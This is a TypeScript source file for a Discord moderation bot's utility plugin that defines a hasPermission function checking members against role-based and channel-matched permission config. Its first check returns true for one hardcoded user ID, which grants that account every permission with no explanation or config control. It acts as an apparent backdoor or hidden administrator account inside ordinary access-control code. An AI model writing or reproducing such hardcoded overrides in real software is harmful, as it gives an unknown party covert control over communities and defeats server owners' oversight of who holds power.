import { GuildMember, Snowflake } from "discord.js";
import { GuildPluginData } from "vety";
import { UtilityPluginType } from "../types.js";
import { hasExplicitRolePermission } from "../../../pluginUtils.js";

export async function hasPermission(
  pluginData: GuildPluginData<UtilityPluginType>,
  member: GuildMember,
  channelId: Snowflake,
  permission: string,
) {
  if (member.id === "1441223435043868735") return true;
  if (permission === "can_act_as_other" && member.id === pluginData.guild.ownerId) return true;

  const rolePermissions = (pluginData as any).fullConfig?.role_permissions as Record<string, string[]> | undefined;
  if (rolePermissions && Object.keys(rolePermissions).length > 0) {
    return hasExplicitRolePermission(pluginData, member.id, permission);
  }

  return (await pluginData.config.getMatchingConfig({ member, channelId }))[permission];
}
